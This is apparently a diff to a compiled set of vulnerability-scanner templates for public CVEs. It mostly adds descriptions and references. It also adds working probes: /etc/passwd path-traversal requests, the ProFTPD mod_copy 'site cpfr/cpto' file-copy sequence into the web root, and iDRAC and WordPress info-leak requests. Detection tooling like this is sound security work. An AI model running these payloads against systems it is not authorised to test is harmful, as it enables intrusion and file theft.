@@ -140,7 +140,7 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "GET /index.php?sl=../../../../../../../etc/passwd%00 HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n"
+            "GET /index.php?sl=../../../../../../../etc/passwd%00 HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n"
           ]
         }
       ]
@@ -467,12 +467,58 @@
       ]
     },
     {
+      "id": "CVE-2015-3306",
+      "info": {
+        "author": "pd-team",
+        "description": "The mod_copy module in ProFTPD 1.3.5 allows remote attackers to read and write to arbitrary files via the site cpfr and site cpto commands.",
+        "name": "ProFTPd RCE",
+        "reference": "https://github.com/t0kx/exploit-CVE-2015-3306",
+        "severity": "high",
+        "tags": "cve,cve2015,ftp,rce,network"
+      },
+      "network": [
+        {
+          "host": [
+            "{{Hostname}}:21"
+          ],
+          "inputs": [
+            {
+              "data": "site cpfr /proc/self/cmdline\r\n",
+              "read": 1024
+            },
+            {
+              "data": "site cpto /tmp/.{{randstr}}\r\n",
+              "read": 1024
+            },
+            {
+              "data": "site cpfr /tmp/.{{randstr}}\r\n",
+              "read": 1024
+            },
+            {
+              "data": "site cpto /var/www/html/{{randstr}}\r\n"
+            }
+          ],
+          "matchers": [
+            {
+              "part": "raw",
+              "type": "word",
+              "words": [
+                "Copy successful"
+              ]
+            }
+          ],
+          "read-size": 1024
+        }
+      ]
+    },
+    {
       "id": "CVE-2015-5688",
       "info": {
         "author": "pikpikcu",
+        "description": "Directory traversal vulnerability in lib/app/index.js in Geddy before 13.0.8 for Node.js allows remote attackers to read arbitrary files via a ..%2f (dot dot encoded slash) in the PATH_INFO to the default URI.",
         "issues": "https://github.com/geddy/geddy/issues/697",
         "name": "Geddy before v13.0.8 LFI",
-        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2015-5688",
+        "reference": "https://nodesecurity.io/advisories/geddy-directory-traversal",
         "severity": "high",
         "tags": "cve,cve2015,geddy,lfi"
       },
@@ -1477,6 +1523,34 @@
       ]
     },
     {
+      "id": "CVE-2018-1207",
+      "info": {
+        "author": "dwisiswant0",
+        "description": "This template supports the detection part only.\n\nDell EMC iDRAC7/iDRAC8, versions prior to 2.52.52.52, contain CGI injection vulnerability\nwhich could be used to execute remote code. A remote unauthenticated attacker may\npotentially be able to use CGI variables to execute remote code.\n\nhttps://github.com/KraudSecurity/Exploits/blob/master/CVE-2018-1207/CVE-2018-1207.py\n",
+        "name": "Dell iDRAC7 and iDRAC8 Devices Code Injection/RCE",
+        "reference": "https://downloads.dell.com/solutions/dell-management-solution-resources/iDRAC_CVE%201207_1211_1000116.pdf",
+        "severity": "critical",
+        "tags": "cve,cve2018,dell,injection,rce"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "all",
+              "type": "word",
+              "words": [
+                "calling init: /lib/"
+              ]
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/cgi-bin/login?LD_DEBUG=files"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2018-1247",
       "info": {
         "author": "madrobot",
@@ -1911,6 +1985,40 @@
           "path": [
             "{{BaseURL}}/wp-admin/admin.php"
           ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2018-18778",
+      "info": {
+        "author": "dhiyaneshDK",
+        "description": "ACME mini_httpd before 1.30 lets remote users read arbitrary files.",
+        "name": "mini_httpd Path Traversal",
+        "reference": "https://www.acunetix.com/vulnerabilities/web/acme-mini_httpd-arbitrary-file-read/",
+        "severity": "high",
+        "tags": "cve,cve2018,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "regex": [
+                "root:[x*]:0:0:"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "GET /etc/passwd HTTP/1.1\nHost:\nContent-Length: 4\n\n"
+          ],
+          "unsafe": true
         }
       ]
     },
@@ -2351,7 +2459,10 @@
         "author": "pikpikcu",
         "description": "The SSI printenv command in Apache Tomcat 9.0.0.M1 to 9.0.0.17, 8.5.0 to 8.5.39 and\n7.0.0 to 7.0.93 echoes user provided data without escaping and is,\ntherefore, vulnerable to XSS. SSI is disabled by default.\nThe printenv command is intended for debugging and is unlikely to be present in a production website.\n",
         "name": "Apache Tomcat XSS",
-        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2019-0221",
+        "reference": [
+          "https://seclists.org/fulldisclosure/2019/May/50",
+          "https://wwws.nightwatchcybersecurity.com/2019/05/27/xss-in-ssi-printenv-command-apache-tomcat-cve-2019-0221/"
+        ],
         "severity": "low",
         "tags": "cve,cve2019,apache,xss"
       },
@@ -2662,7 +2773,8 @@
           "raw": [
             "POST /wp-admin/options-general.php?page=yuzo-related-post HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\nContent-Type: application/x-www-form-urlencoded\n\nyuzo_related_post_css_and_style=</style><script>alert(0);</script>\n",
             "GET / HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\nUpgrade-Insecure-Requests: 1\n"
-          ]
+          ],
+          "req-condition": true
         }
       ]
     },
@@ -3149,7 +3261,13 @@
       "id": "CVE-2019-1653",
       "info": {
         "author": "dwisiswant0",
+        "description": "A vulnerability in the web-based management interface of Cisco Small Business RV320 and RV325 Dual Gigabit WAN VPN Routers could allow an unauthenticated, remote attacker to retrieve sensitive information. The vulnerability is due to improper access controls for URLs. An attacker could exploit this vulnerability by connecting to an affected device via HTTP or HTTPS and requesting specific URLs. A successful exploit could allow the attacker to download the router configuration or detailed diagnostic information. Cisco has released firmware updates that address this vulnerability.",
         "name": "Unauthenticated Cisco Small Business WAN VPN Routers Sensitive Info Disclosure",
+        "reference": [
+          "https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190123-rv-info",
+          "https://www.exploit-db.com/exploits/46262/",
+          "https://www.exploit-db.com/exploits/46655/"
+        ],
         "severity": "high",
         "tags": "cve,cve2019,cisco"
       },
@@ -3659,7 +3777,9 @@
       "id": "CVE-2019-2588",
       "info": {
         "author": "madrobot",
+        "description": "Vulnerability in the BI Publisher (formerly XML Publisher) component of Oracle Fusion Middleware (subcomponent: BI Publisher Security)\n",
         "name": "Oracle Business Intelligence Path Traversal",
+        "reference": "http://www.oracle.com/technetwork/security-advisory/cpuapr2019-5072813.html",
         "severity": "high",
         "tags": "cve,cve2019,oracle,traversal"
       },
@@ -3698,6 +3818,9 @@
       "requests": [
         {
           "body": "<?xml version=\"1.0\" encoding=\"UTF-8\" ?> <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ads=\"http://www.w3.org/2005/08/addressing\">\n  <soapenv:Header></soapenv:Header>\n  <soapenv:Body></soapenv:Body>\n</soapenv:Envelope>",
+          "headers": {
+            "Content-Type": "application/soap;  charset=\"utf-8\""
+          },
           "matchers": [
             {
               "part": "body",
@@ -3732,8 +3855,9 @@
       "id": "CVE-2019-3396",
       "info": {
         "author": "Harsh Bothra",
+        "description": "The Widget Connector macro in Atlassian Confluence Server before version 6.6.12 (the fixed version for 6.6.x), from version 6.7.0 before 6.12.3 (the fixed version for 6.12.x), from version 6.13.0 before 6.13.3 (the fixed version for 6.13.x), and from version 6.14.0 before 6.14.2 (the fixed version for 6.14.x), allows remote attackers to achieve path traversal and remote code execution on a Confluence Server or Data Center instance via server-side template injection.",
         "name": "Atlassian Confluence Path Traversal",
-        "refrense": "https://github.com/x-f1v3/CVE-2019-3396",
+        "reference": "https://github.com/x-f1v3/CVE-2019-3396",
         "severity": "high",
         "tags": "cve,cve2019,atlassian,confluence,traversal,rce"
       },
@@ -3766,7 +3890,7 @@
         "author": "pdteam",
         "description": "The ConfigurePortalPages.jspa resource in Jira before version 7.13.3 and from version 8.0.0 before version 8.1.1 allows remote attackers to inject arbitrary HTML or JavaScript via a cross site scripting (XSS) vulnerability in the searchOwnerUserName parameter.",
         "name": "Jira - Reflected XSS using searchOwnerUserName parameter.",
-        "refrense": "https://gist.github.com/0x240x23elu/891371d46a1e270c7bdded0469d8e09c",
+        "reference": "https://gist.github.com/0x240x23elu/891371d46a1e270c7bdded0469d8e09c",
         "severity": "medium",
         "tags": "cve,cve2019,atlassian,jira,xss"
       },
@@ -4727,6 +4851,7 @@
       "info": {
         "author": "pikpikcu",
         "name": "GLPI v.9.4.6 - Open redirect",
+        "reference": "- https://github.com/glpi-project/glpi/security/advisories/GHSA-gxv6-xq9q-37hg\n- https://github.com/glpi-project/glpi/archive/9.4.6.zip\n- https://nvd.nist.gov/vuln/detail/CVE-2020-11034\n",
         "severity": "low",
         "tags": "cve,cve2020,redirect"
       },
@@ -5148,6 +5273,10 @@
         "author": "dwisiswant0",
         "description": "Netsweeper through 6.4.3 allows unauthenticated remote code execution because webadmin/tools/unixlogin.php (with certain Referer headers) launches a command line with client-supplied parameters, and allows injection of shell metacharacters.",
         "name": "Netsweeper WebAdmin unixlogin.php Python Code Injection",
+        "reference": [
+          "https://ssd-disclosure.com/ssd-advisory-netsweeper-preauth-rce/",
+          "https://portswigger.net/daily-swig/severe-rce-vulnerability-in-content-filtering-system-has-been-patched-netsweeper-says"
+        ],
         "severity": "critical",
         "tags": "cve,cve2020,netsweeper,rce"
       },
@@ -5186,8 +5315,9 @@
       "id": "CVE-2020-13483",
       "info": {
         "author": "pikpikcu",
+        "description": "The Web Application Firewall in Bitrix24 through 20.0.0 allows XSS via the items[ITEMS][ID] parameter to the components/bitrix/mobileapp.list/ajax.php/ URI.",
         "name": "Bitrix24 through 20.0.0 allows XSS",
-        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2020-13483",
+        "reference": "https://gist.github.com/mariuszpoplwski/ca6258cf00c723184ebd2228ba81f558",
         "severity": "high",
         "tags": "cve,cve2020,xss,bitrix"
       },
@@ -5224,12 +5354,58 @@
       ]
     },
     {
+      "id": "CVE-2020-13700",
+      "info": {
+        "author": "pikpikcu",
+        "description": "An issue was discovered in the acf-to-rest-api plugin through 3.1.0 for WordPress.\nIt allows an insecure direct object reference via permalinks manipulation, as demonstrated by a\nwp-json/acf/v3/options/ request that reads sensitive information in the wp_options table, such as the login and pass values.\n",
+        "name": "acf-to-rest-api wordpress plugin IDOR",
+        "reference": "https://gist.github.com/mariuszpoplwski/4fbaab7f271bea99c733e3f2a4bafbb5",
+        "severity": "high",
+        "tags": "cve,cve2020,wordpress"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "Content-Type: application/json"
+              ]
+            },
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "acf-to-rest-api\\/class-acf-to-rest-api.php"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-json/acf/v3/options/a?id=active&field=plugins"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2020-13937",
       "info": {
         "author": "pikpikcu",
         "description": "Apache Kylin 2.0.0, 2.1.0, 2.2.0, 2.3.0, 2.3.1, 2.3.2, 2.4.0,\n2.4.1, 2.5.0, 2.5.1, 2.5.2, 2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4,\n2.6.5, 2.6.6, 3.0.0-alpha, 3.0.0-alpha2, 3.0.0-beta, 3.0.0, 3.0.1,\n3.0.2, 3.1.0, 4.0.0-alpha has one restful api which exposed\nKylin's configuration information without any authentication,\nso it is dangerous because some confidential information entries will be disclosed to everyone.\n",
         "name": "Apache Kylin Unauth",
-        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2020-13937",
+        "reference": [
+          "https://kylin.apache.org/docs/release_notes.html",
+          "https://s.tencent.com/research/bsafe/1156.html"
+        ],
         "severity": "medium",
         "tags": "cve,cve2020,apache"
       },
@@ -5274,8 +5450,12 @@
       "id": "CVE-2020-13942",
       "info": {
         "author": "dwisiswant0",
-        "description": "Remote Code Execution in Apache Unomi.\nApache Unomi allows conditions to use OGNL and MVEL scripting which\noffers the possibility to call static Java classes from the JDK\nthat could execute code with the permission level of the running Java process.\nThis vulnerability affects all versions of Apache Unomi prior to 1.5.2. Apache Unomi users should upgrade to 1.5.2 or later.\n\nReferences:\n- https://securityboulevard.com/2020/11/apache-unomi-cve-2020-13942-rce-vulnerabilities-discovered/\n- https://twitter.com/chybeta/status/1328912309440311297\n",
+        "description": "Remote Code Execution in Apache Unomi.\nApache Unomi allows conditions to use OGNL and MVEL scripting which\noffers the possibility to call static Java classes from the JDK\nthat could execute code with the permission level of the running Java process.\nThis vulnerability affects all versions of Apache Unomi prior to 1.5.2. Apache Unomi users should upgrade to 1.5.2 or later.\n",
         "name": "Apache Unomi Remote Code Execution",
+        "reference": [
+          "https://securityboulevard.com/2020/11/apache-unomi-cve-2020-13942-rce-vulnerabilities-discovered/",
+          "https://twitter.com/chybeta/status/1328912309440311297"
+        ],
         "severity": "critical",
         "tags": "cve,cve2020,apache,rce"
       },
@@ -5325,7 +5505,7 @@
         "author": "x1m_martijn",
         "description": "Affected versions of Atlassian Jira Server and Data Center allow remote, unauthenticated attackers to view custom field names and custom SLA names via an Information Disclosure vulnerability in the /secure/QueryComponent!Default.jspa endpoint. The affected versions are before version 8.5.8, and from version 8.6.0 before 8.11.1.",
         "name": "Sensitive data exposure via insecure Jira endpoint",
-        "reference": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-14179",
+        "reference": "https://jira.atlassian.com/browse/JRASERVER-71536",
         "severity": "medium",
         "tags": "cve,cve2020,atlassian,jira"
       },
@@ -5393,8 +5573,9 @@
       "id": "CVE-2020-14413",
       "info": {
         "author": "pikpikcu",
+        "description": "NeDi 1.9C is vulnerable to XSS because of an incorrect implementation of sanitize() in inc/libmisc.php. This function attempts to escape the SCRIPT tag from user-controllable values, but can be easily bypassed, as demonstrated by an onerror attribute of an IMG element as a Devices-Config.php?sta= value.",
         "name": "NeDi 1.9C XSS",
-        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2020-14413",
+        "reference": "https://gist.github.com/farid007/8db2ab5367ba00e87f9479b32d46fea8",
         "severity": "medium",
         "tags": "cve,cve2020,nedi,xss"
       },
@@ -5437,15 +5618,16 @@
         "cvss": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
         "description": "Oracle Business Intelligence Enterprise Edition 5.5.0.0.0 / 12.2.1.3.0 / 12.2.1.4.0 - \"getPreviewImage\" Directory Traversal/Local File Inclusion",
         "name": "Oracle Fusion - \"getPreviewImage\" Directory Traversal/Local File Inclusion",
+        "reference": [
+          "http://packetstormsecurity.com/files/159748/Oracle-Business-Intelligence-Enterprise-Edition-5.5.0.0.0-12.2.1.3.0-12.2.1.4.0-LFI.html",
+          "https://www.oracle.com/security-alerts/cpuoct2020.html"
+        ],
         "severity": "high",
         "tags": "cve,cve2020,oracle,traversal"
       },
       "requests": [
         {
           "cookie-reuse": true,
-          "headers": {
-            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
-          },
           "matchers": [
             {
               "status": [
@@ -5476,7 +5658,12 @@
         "author": "dwisiswant0",
         "description": "Vulnerability in the Oracle WebLogic Server\nproduct of Oracle Fusion Middleware (component: Console).\nSupported versions that are affected are 10.3.6.0.0,\n12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0.\nEasily exploitable vulnerability allows unauthenticated\nattacker with network access via HTTP to compromise the server.\nSuccessful attacks of this vulnerability can result in takeover.\n",
         "name": "Oracle WebLogic Server Unauthenticated RCE (and Patch Bypass)",
-        "reference": "https://testbnull.medium.com/weblogic-rce-by-only-one-get-request-cve-2020-14882-analysis-6e4b09981dbf",
+        "reference": [
+          "https://testbnull.medium.com/weblogic-rce-by-only-one-get-request-cve-2020-14882-analysis-6e4b09981dbf",
+          "https://twitter.com/jas502n/status/1321416053050667009",
+          "https://youtu.be/JFVDOIL0YtA",
+          "https://github.com/jas502n/CVE-2020-14882#eg"
+        ],
         "severity": "critical",
         "tags": "cve,cve2020,oracle,rce,weblogic"
       },
@@ -5555,8 +5742,14 @@
       "id": "CVE-2020-15505",
       "info": {
         "author": "dwisiswant0",
+        "description": "A remote code execution vulnerability in MobileIron Core & Connector versions 10.3.0.3 and earlier, 10.4.0.0, 10.4.0.1, 10.4.0.2, 10.4.0.3, 10.5.1.0, 10.5.2.0 and 10.6.0.0; and Sentry versions 9.7.2 and earlier, and 9.8.0; and Monitor and Reporting Database (RDB) version 2.0.0.1 and earlier that allows remote attackers to execute arbitrary code via unspecified vectors.\n",
         "name": "RCE in MobileIron Core & Connector <= v10.6 & Sentry <= v9.8",
-        "reference": "https://blog.orange.tw/2020/09/how-i-hacked-facebook-again-mobileiron-mdm-rce.html",
+        "reference": [
+          "https://blog.orange.tw/2020/09/how-i-hacked-facebook-again-mobileiron-mdm-rce.html",
+          "https://github.com/iamnoooob/CVE-Reverse/tree/master/CVE-2020-15505",
+          "https://github.com/iamnoooob/CVE-Reverse/blob/master/CVE-2020-15505/hessian.py#L10",
+          "https://github.com/orangetw/JNDI-Injection-Bypass"
+        ],
         "severity": "critical",
         "tags": "cve,cve2020,mobileiron,rce"
       },
@@ -5657,8 +5850,12 @@
       "id": "CVE-2020-16846",
       "info": {
         "author": "dwisiswant0",
-        "description": "SaltStack Salt through 3002. Sending crafted web requests to the Salt API,\nwith the SSH client enabled, can result in shell injection.\n\nThis template supports the detection part only. See references.\n\nReferences:\n- https://mp.weixin.qq.com/s/R8qw_lWizGyeJS0jOcYXag\n- https://github.com/vulhub/vulhub/tree/master/saltstack/CVE-2020-16846\n",
+        "description": "SaltStack Salt through 3002. Sending crafted web requests to the Salt API,\nwith the SSH client enabled, can result in shell injection.\n\nThis template supports the detection part only. See references.\n",
         "name": "SaltStack Shell Injection",
+        "reference": [
+          "https://mp.weixin.qq.com/s/R8qw_lWizGyeJS0jOcYXag",
+          "https://github.com/vulhub/vulhub/tree/master/saltstack/CVE-2020-16846"
+        ],
         "severity": "critical",
         "tags": "cve,cve2020,saltstack"
       },
@@ -5702,8 +5899,13 @@
       "id": "CVE-2020-16952",
       "info": {
         "author": "dwisiswant0",
+        "description": "A remote code execution vulnerability exists in Microsoft SharePoint when the software fails to check the source markup of an application package, aka 'Microsoft SharePoint Remote Code Execution Vulnerability'. This CVE ID is unique from CVE-2020-16951.",
         "name": "Microsoft SharePoint Server-Side Include (SSI) and ViewState RCE",
-        "reference": "https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16952",
+        "reference": [
+          "https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16952",
+          "https://srcincite.io/pocs/cve-2020-16952.py.txt",
+          "https://github.com/rapid7/metasploit-framework/blob/1a341ae93191ac5f6d8a9603aebb6b3a1f65f107/documentation/modules/exploit/windows/http/sharepoint_ssi_viewstate.md"
+        ],
         "severity": "critical",
         "tags": "cve,cve2020,sharepoint,iis"
       },
@@ -5747,6 +5949,7 @@
       "id": "CVE-2020-17496",
       "info": {
         "author": "pussycat0x",
+        "description": "vBulletin 5.5.4 through 5.6.2 allows remote command execution via crafted subWidgets data in an ajax/render/widget_tabbedcontainer_tab_panel request. NOTE: this issue exists because of an incomplete fix for CVE-2019-16759.\n",
         "name": "vBulletin Pre-Auth RCE",
         "reference": "https://www.tenable.com/blog/zero-day-remote-code-execution-vulnerability-in-vbulletin-disclosed",
         "severity": "critical",
@@ -5781,6 +5984,7 @@
         "author": "dwisiswant0",
         "description": "Artica Web Proxy 4.30.000000 allows an authenticated remote attacker to inject commands via the service-cmds parameter in cyrus.php. These commands are executed with root privileges via service_cmds_peform.",
         "name": "Artica Web Proxy 4.30 OS Command Injection",
+        "reference": "https://blog.max0x4141.com/post/artica_proxy/",
         "severity": "high",
         "tags": "cve,cve2020,rce"
       },
@@ -5819,6 +6023,7 @@
         "author": "dwisiswant0",
         "description": "Artica Web Proxy 4.30.00000000 allows remote attacker to bypass privilege detection and gain web backend administrator privileges through SQL injection of the apikey parameter in fw.login.php.",
         "name": "Artica Web Proxy 4.30 Authentication Bypass",
+        "references": "https://blog.max0x4141.com/post/artica_proxy/",
         "severity": "critical",
         "tags": "cve,cve2020"
       },
@@ -5871,6 +6076,7 @@
       "id": "CVE-2020-17518",
       "info": {
         "author": "pd-team",
+        "description": "Apache Flink 1.5.1 introduced a REST handler that allows you to write an uploaded file to an arbitrary location on the local file system,\nthrough a maliciously modified HTTP HEADER.\n",
         "name": "Apache Flink Upload Path Traversal",
         "reference": "https://github.com/vulhub/vulhub/tree/master/flink/CVE-2020-17518",
         "severity": "critical",
@@ -5937,8 +6143,14 @@
       "id": "CVE-2020-17530",
       "info": {
         "author": "pikpikcu",
+        "description": "Forced OGNL evaluation, when evaluated on raw user input in tag attributes, may lead to remote code execution. Affected software : Apache Struts 2.0.0 - Struts 2.5.25.\n",
         "name": "Apache Struts RCE",
-        "reference": "http://packetstormsecurity.com/files/160721/Apache-Struts-2-Forced-Multi-OGNL-Evaluation.html",
+        "reference": [
+          "http://packetstormsecurity.com/files/160721/Apache-Struts-2-Forced-Multi-OGNL-Evaluation.html",
+          "http://jvn.jp/en/jp/JVN43969166/index.html",
+          "https://cwiki.apache.org/confluence/display/WW/S2-061",
+          "https://security.netapp.com/advisory/ntap-20210115-0005/"
+        ],
         "severity": "critical",
         "tags": "cve,cve2020,apache,rce,struts"
       },
@@ -6167,7 +6379,7 @@
       "info": {
         "author": "geeknik",
         "description": "Open redirect vulnerability in b2evolution CMS version prior to 6.11.6 allows an attacker to perform malicious open redirects to an attacker controlled resource via redirect_to parameter in email_passthrough.php.",
-        "name": "CVE-2020-22840",
+        "name": "b2evolution CMS Open redirect",
         "severity": "low",
         "tags": "cve,cve2020,redirect,b2evolution"
       },
@@ -6366,12 +6578,15 @@
       ]
     },
     {
-      "id": "CVE-2020–25213",
+      "id": "CVE-2020-25213",
       "info": {
         "author": "foulenzer",
         "description": "The vulnerability allows unauthenticated remote attackers to upload .php files. This templates only detects the plugin, not its vulnerability.",
         "name": "WP File Manager RCE",
-        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2020-25213",
+        "reference": [
+          "https://plugins.trac.wordpress.org/changeset/2373068",
+          "https://github.com/w4fz5uck5/wp-file-manager-0day"
+        ],
         "severity": "critical",
         "tags": "cve,cve2020,wordpress,rce"
       },
@@ -6480,11 +6695,11 @@
       ]
     },
     {
-      "id": "CVE-2020–26073",
+      "id": "CVE-2020-26073",
       "info": {
         "author": "madrobot",
         "name": "Cisco SD-WAN vManage Software Directory Traversal",
-        "reference": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020–26073",
+        "reference": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26073",
         "severity": "high",
         "tags": "cve,cve2020,cisco,lfi"
       },
@@ -6519,7 +6734,11 @@
         "author": "CasperGN",
         "description": "Alerta prior to version 8.1.0 is prone to Authentication Bypass when using LDAP as authorization provider and the LDAP server accepts Unauthenticated Bind reqests.",
         "name": "Alerta Authentication Bypass (CVE-2020-26214)",
-        "reference": "https://github.com/advisories/GHSA-5hmm-x8q8-w5jh",
+        "reference": [
+          "https://github.com/advisories/GHSA-5hmm-x8q8-w5jh",
+          "https://tools.ietf.org/html/rfc4513#section-5.1.2",
+          "https://pypi.org/project/alerta-server/8.1.0/"
+        ],
         "severity": "critical",
         "tags": "cve,cve2020,alerta"
       },
@@ -8018,11 +8237,12 @@
       ]
     },
     {
-      "id": "CVE-2020–26073",
+      "id": "CVE-2020-26073",
       "info": {
         "author": "madrobot",
+        "description": "A vulnerability in the application data endpoints of Cisco SD-WAN vManage Software could allow an unauthenticated, remote attacker to gain access to sensitive information.\n\nThe vulnerability is due to improper validation of directory traversal character sequences within requests to application programmatic interfaces (APIs). An attacker could exploit this vulnerability by sending malicious requests to an API within the affected application. A successful exploit could allow the attacker to conduct directory traversal attacks and gain access to sensitive information including credentials or user tokens.\n",
         "name": "Cisco SD-WAN vManage Software Directory Traversal",
-        "reference": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020–26073",
+        "reference": "https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-vman-traversal-hQh24tmk.html",
         "severity": "high",
         "tags": "Directory Traversal"
       },
